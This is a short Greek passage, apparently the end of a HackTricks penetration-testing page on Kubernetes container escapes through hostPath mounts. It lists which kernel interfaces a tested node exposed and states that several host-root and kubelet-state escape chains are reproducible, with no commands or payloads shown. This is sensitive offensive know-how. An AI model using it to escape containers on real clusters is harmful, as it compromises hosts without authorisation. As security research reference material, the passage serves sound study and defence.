Το ίδιο node εξέθετε τα `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` και `config.gz`, αλλά δεν εξέθετε τα `uevent_helper`, EFI variables, thermal entries ή `sched_debug`. Δεν εκτελέστηκαν destructive kernel triggers. Αυτό επιβεβαιώνει ότι οι αλυσίδες host-root, `/var`, kubelet-state, socket και host-consumer είναι αναπαραγώγιμες, ενώ οι τεχνικές βοηθητικών εργαλείων procfs/sysfs πρέπει να παραμένουν conditional, ανάλογα με τον ακριβή kernel, το mount mode, το payload path και το trigger.

## References

- [1] [Τοπικά αρχεία και paths που χρησιμοποιούνται από το Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Το container cilium-agent μπορεί να αποκτήσει πρόσβαση στον host μέσω mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
